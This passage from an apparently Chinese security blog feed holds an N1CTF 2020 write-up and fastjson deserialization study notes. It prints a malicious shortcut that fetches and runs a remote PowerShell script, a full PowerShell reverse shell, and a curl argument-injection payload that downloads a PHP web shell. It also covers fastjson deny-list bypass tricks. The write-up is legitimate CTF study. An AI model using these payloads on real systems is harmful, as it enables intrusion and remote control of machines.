bot)"></a>The king of phish (Victim bot)</h2><p>source</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> LnkParse3 <span class="keyword">as</span> Lnk</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    source = open(__file__, <span class="string">'r'</span>).read().replace(<span class="string">"\n"</span>, <span class="string">"\x3c\x62\x72\x3e"</span>).replace(<span class="string">" "</span>, <span class="string">"\x26\x6e\x62\x73\x70\x3b"</span>)</span><br><span class="line">    <span class="keyword">return</span> source</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/send', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendFile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'No file part'</span></span><br><span class="line">    file = request.files[<span class="string">'file'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'No selected file'</span></span><br><span class="line">    data = file.stream.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data.startswith(<span class="string">b"\x4c\x00"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"You're a bad guy!"</span></span><br><span class="line">    shortcut = Lnk.lnk_file(indata=data)</span><br><span class="line">    <span class="keyword">if</span> shortcut.data[<span class="string">'command_line_arguments'</span>].count(<span class="string">" "</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"File is killed by antivirus."</span></span><br><span class="line">    filename = str(uuid.uuid4())+<span class="string">".lnk"</span></span><br><span class="line">    fullname = os.path.join(os.path.abspath(os.curdir) + <span class="string">"/uploads"</span>, filename)</span><br><span class="line">    open(fullname, <span class="string">"wb"</span>).write(data)</span><br><span class="line">    clickLnk(fullname)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Clicked."</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clickLnk</span><span class="params">(lnkPath)</span>:</span></span><br><span class="line">    os.system(<span class="string">'cmd /c "%s"'</span> % lnkPath)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>这里开始主要是被lnk的命令里bypass 空格给困扰了。后来想起来不用空格还可以用其他不可见字符.那就很简单了。用<code>\t</code>替换下空格即可。<br>結果找半天没找到恶意lnk的生成工具。。。</p><p>最后今天复现时找到一个windows上的。 <a href="https://github.com/fireeye/SharPersist" target="_blank" rel="noopener">https://github.com/fireeye/SharPersist</a><br>用以下命令即可生成lnk文件.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharPersist.exe <span class="literal">-t</span> startupfolder <span class="literal">-c</span> <span class="string">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"</span> <span class="literal">-a</span> <span class="string">"IEX(New-Object`tNet.WebClient).DownloadString('http://xxx/byc.ps1')"</span> <span class="operator">-f</span> <span class="string">"byc1"</span> <span class="literal">-m</span> add</span><br></pre></td></tr></table></figure><p>这里用到一个小技巧：powershell命令行下可以直接用<code>`t</code> 来表示字符串中的<code>\t</code>。</p><p>然后开始准备用的是nishang的反弹shell脚本。结果没反应,感觉是被防火墙拦了。所以就换了个简单的<br>服务器上的byc.ps1</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">"10.0.2.4"</span>,<span class="number">9001</span>);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">"PS "</span> + (pwd).Path + <span class="string">"&gt; "</span>;<span class="variable">$sendbyte</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure><p>最后发送即可getshell<br><img src="/2020/10/19/N1CTF2020/1.PNG" alt></p><p>flag在userA 桌面<br><code>n1ctf{I&#39;m_a_little_fish,_swimming_in_the_ocean}</code></p><p>后面拿域控的思路就没有了…</p><h2 id="Docker-Manager"><a href="#Docker-Manager" class="headerlink" title="Docker_Manager"></a>Docker_Manager</h2><p>BUU上面又复现了两题。zabbix_fun直接拿exp打的。Docker_Manager可以记录下</p><p>赵总的wp很详细了。学到很多<br><a href="https://www.zhaoj.in/read-6750.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6750.html</a></p><p>题目核心代码基本就是下面了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$cmd = <span class="string">'curl --connect-timeout 10 '</span> . $host_addr . <span class="string">' -g '</span> . $cert . $key . $cacert;</span><br><span class="line">$output = <span class="keyword">array</span>();</span><br><span class="line">$ret = <span class="number">0</span>;</span><br><span class="line">exec($cmd, $output, $ret);</span><br></pre></td></tr></table></figure><p>显然就是一个curl的参数注入。但是利用起来比较有趣。</p><blockquote><p>You tell curl to read more command-line options from a specific file with the -K/–config option, like this:</p></blockquote><p>-K是可以读取一个配置文件的。然后如果配置文件demo如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># --- Example file ---</span><br><span class="line"># this is a comment</span><br><span class="line">url &#x3D; &quot;example.com&quot;</span><br><span class="line">output &#x3D; &quot;curlhere.html&quot;</span><br><span class="line">user-agent &#x3D; &quot;superagent&#x2F;1.0&quot;</span><br><span class="line"> </span><br><span class="line"># and fetch another URL too</span><br><span class="line">url &#x3D; &quot;example.com&#x2F;docs&#x2F;manpage.html&quot;</span><br><span class="line">-O</span><br><span class="line">referer &#x3D; &quot;http:&#x2F;&#x2F;nowhereatall.example.com&#x2F;&quot;</span><br><span class="line"># --- End of example file ---</span><br></pre></td></tr></table></figure><p>也就是说，只要K能加载到设计过的配置文件，就能读内容并输出。这只用到了<code>-K</code>一个指令，即可达成写shell的目的。<br>然后就是非常巧妙的一个利用了。我们需要想办法读到配置文件，而这就是利用了<code>/proc/xxx/cmdline</code><br>原来我们知道，<code>/proc/self/cmdline</code>常用于读取java,python这样的web应用的一些简单配置。但是实际上其他命令行或者说一个pid都会对应其运行时的命令即<code>/proc/{pid}/cmdline</code>。</p><p>那么假如我们有办法让cmdline长时间驻留，就可以爆破pid读取到配置文件。这里可以利用<code>/dev/urandom</code>等等文件。实际上dev下很多没有实际大小的文件都可以用来读取。</p><p>那么首先我们利用换行符,就能在某个pid的cmdline构造如下的一个配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?host&#x3D;-K&#x2F;dev&#x2F;urandom%00&amp;cacert&#x3D;111%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0aurl&#x3D;&quot;http:&#x2F;&#x2F;frps:9001&#x2F;byc.php&quot;%0aoutput&#x3D;&quot;img&#x2F;byc.php&quot;%0a%0a%0a%0a%0a%0a%0a</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl --connect-timeout 10 <span class="string">'-K/dev/urandom'</span> --cacert=<span class="string">'111</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">url="http://frps:9001/byc.php"</span></span><br><span class="line"><span class="string">output="img/byc.php"</span></span><br></pre></td></tr></table></figure><p>接下来就是同样的办法爆破<code>-K/proc/xx/cmdline</code>，从而加载上面的配置文件，写进shell</p><p>getshell后 <code>trap &quot;&quot; 14 &amp;&amp; /readflag</code>即可。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记-Java深入</title>
      <link href="2020/10/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E6%B7%B1%E5%85%A5/"/>
      <url>2020/10/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E6%B7%B1%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>java继续开坑学习。看到哪个学哪个，shiro懒得看了。</p><a id="more"></a><h1 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1><p>exp利用不必多说，主要是学习下原理。以下都在jdk1.8调试。</p><p>可以按wh1t3p1g师傅的博文学习。<br><a href="https://blog.0kami.cn/2020/04/13/talk-about-fastjson-deserialization/" target="_blank" rel="noopener">https://blog.0kami.cn/2020/04/13/talk-about-fastjson-deserialization/</a></p><p>三个demo类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Phone phone;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, Phone phone)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.phone = phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name+<span class="string">":"</span>+phone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String phoneNumber;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Phone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Phone</span><span class="params">(String phoneNumber)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.phoneNumber = phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NewPhone</span> <span class="keyword">extends</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String location;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NewPhone</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NewPhone</span><span class="params">(String phoneNumber, String location)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.phoneNumber = phoneNumber;</span><br><span class="line">        <span class="keyword">this</span>.location = location;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.phoneNumber+<span class="string">":"</span>+<span class="keyword">this</span>.location;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fastjson库一般我们重点关注几个基本功能方法</p><ul><li><code>JSON.toJSONString()</code></li><li><code>JSON.parse()</code></li><li><code>JSON.parseObject()</code></li></ul><p>Test</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="string">"byc_404"</span>,<span class="keyword">new</span> Phone(<span class="string">"123123123"</span>));</span><br><span class="line">        <span class="comment">//Person person = new Person("byc_404",new NewPhone("123123123","china"));</span></span><br><span class="line">        String json = JSON.toJSONString(person);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        Person p = JSON.parseObject(json, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ouput:</span></span><br><span class="line"><span class="comment">//1.</span></span><br><span class="line"><span class="comment">//&#123;"name":"byc_404","phone":&#123;"phoneNumber":"123123123"&#125;&#125;</span></span><br><span class="line"><span class="comment">//byc_404:123123123</span></span><br><span class="line"><span class="comment">//2.</span></span><br><span class="line"><span class="comment">//&#123;"name":"byc_404","phone":&#123;"location":"china","phoneNumber":"123123123"&#125;&#125;</span></span><br><span class="line"><span class="comment">//byc_404:123123123</span></span><br></pre></td></tr></table></figure><p>这里最显著的问题就是。我们两次执行代码时在<code>parseObject</code>后输出的结果是一致的。这显然不符合我们的预期,因为这直接丢失了newphone类的location属性。</p><blockquote><p>由于fastjson不知道需要还原的Person的Phone是本身还是子类NewPhone，面对这种多态方式，fastjson还原的是父类，而不是子类NewPhone</p></blockquote><p>在这种情况下就产生了autotype.我们将上面<code>TOJSONString</code>这行代码更改下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String json = JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="comment">//&#123;"@type":"Person","name":"john","phone":&#123;"@type":"NewPhone","location":"china","phoneNumber":"123123123"&#125;&#125;</span></span><br><span class="line"><span class="comment">//john:123123123:china</span></span><br></pre></td></tr></table></figure><p>这里我们可以看到<code>@type</code>帮助我们避免了子类丢失字段的问题,成功还原了对象。但是我们自然可以想到,如果将其指定为恶意类,就可能导致恶意代码执行了。这就是最早的fastjson版本的rce漏洞。</p><p>然后因为本地jdk1.8版本太高就不复现了……打法自然是rmi / ldap两种方法。</p><p>这里提一下fastjson之所以能执行一系列方法的起因:fastjson 自动调用getter和setter以及无参数的构造函数</p><p>这里不深入跟,直接给出结论<br>setter提取条件：</p><ul><li>函数名长度大于等于4</li><li>非静态函数</li><li>限制返回类型为void或当前类</li><li>函数参数只有一个</li><li>函数名以set开头，第四个字符是大写或者unicde或者_或者字母f；如果函数名长度&gt;=5，看第5位字符是不是大写的</li></ul><p>getter提取条件：</p><ul><li>函数名长度大于等于4</li><li>非静态函数</li><li>函数名以get开头，第四个字符大写</li><li>函数参数为0个</li><li>函数的返回类型为Collection的子类或本身、Map的子类或本身、 AtomicBoolean、AtomicInteger、AtomicLong<br>无相对应的setter函数</li></ul><blockquote><p>经过上述的两个条件提取后，保留了符合条件的getter和setter，并于com/alibaba/fastjson/parser/deserializer/FieldDeserializer.java#setValue函数中invoke调用，也就是说实现了类似反序列化过程中主动调用readObject函数的效果。</p></blockquote><p>由条件，此时可以利用传入某字段的方式来主动调用相关符合条件的setter和getter。例如在Person里面添加一个setTest函数，并在需要转化的json中添加”test”:1，这将会主动调用setTest。<br>如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTest</span><span class="params">(String test)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.test = test;</span><br><span class="line">    System.out.println(<span class="string">"setTest Method called!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String json=<span class="string">"&#123;\"name\":\"byc_404\",\"phone\":&#123;\"phoneNumber\":\"123123123\"&#125;,\"test\":\"1\"&#125;"</span>;</span><br><span class="line">Person p = JSON.parseObject(json, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">System.out.println(p);</span><br><span class="line"></span><br><span class="line"><span class="comment">//output:</span></span><br><span class="line"><span class="comment">//setTest Method called!</span></span><br><span class="line"><span class="comment">//byc_404:123123123</span></span><br></pre></td></tr></table></figure><p><strong>我们在利用@type构造有危害的利用链时，主要就是查找有危害的无参数的构造函数、符合条件的getter和setter。</strong></p><h2 id="1-2-24-修复-bypass"><a href="#1-2-24-修复-bypass" class="headerlink" title="1.2.24 修复 bypass"></a>1.2.24 修复 bypass</h2><p>然后改下maven里fastjson依赖看看高一个版本的fastjson防护。发现多了一个checkAutoType方法。当然这个版本同时需要手动开启autoType.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    String deny;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.acceptList.length; ++i) &#123;</span><br><span class="line">        deny = <span class="keyword">this</span>.acceptList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">            <span class="keyword">return</span> TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">        deny = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里做了一次白名单一次黑名单的检查。优先载入手工配置的白名单类，并对黑名单类爆出异常。<br>然后后面继续调用时,如果不符合前面的情况，后面就会进入这一段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.acceptList.length; ++i) &#123;</span><br><span class="line">    accept = <span class="keyword">this</span>.acceptList[i];</span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>loadClass</code>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">'['</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>)) &#123;</span><br><span class="line">        String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ......</span><br></pre></td></tr></table></figure><p>在黑名单检测之后，当开头有<code>[</code>或者开头有<code>L</code>和结尾有<code>;</code>时会去掉这些字符，从而造成了黑名单的绕过。因为它是用startswith检测黑名单的。</p><h2 id="1-2-42-bypass"><a href="#1-2-42-bypass" class="headerlink" title="1.2.42 bypass"></a>1.2.42 bypass</h2><p>然后上面那个bypass的修复主要是</p><p><img src="/2020/10/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E6%B7%B1%E5%85%A5/0.PNG" alt></p><p>把黑名单全部换成hash防止深入是这个版本的特点,同时上面这个代码的作用是如果满足某个条件的话就去掉那些<code>Lxxx;</code>的前后第一个字符。<br>然而修复治标不治本，说实话有点蠢,这里只需要<code>LLxxx;;</code>就能绕了。<br>而且黑名单hash也有dalao 测过的。之前看LandGrey佬收藏过，<br><a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a></p><h2 id="1-2-47-bypass"><a href="#1-2-47-bypass" class="headerlink" title="1.2.47 bypass"></a>1.2.47 bypass</h2><p>1.2.48以前的checkAutoTyye有这样一段代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Arrays.binarySearch(<span class="keyword">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className) &#123;</span><br><span class="line">    <span class="keyword">return</span> (Class)mappings.get(className);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里很奇怪的if的条件导致：即使前面搜到了黑名单里的类，如果mappings里面存在这个类,那么仍可以进行下一步操作。<br>这里的mappings是fastjson提早载入的一些缓存类</p><p>那么假如可以将恶意类加入mappings就能有绕过的效果了。</p><p>这里我们继续跟进</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == <span 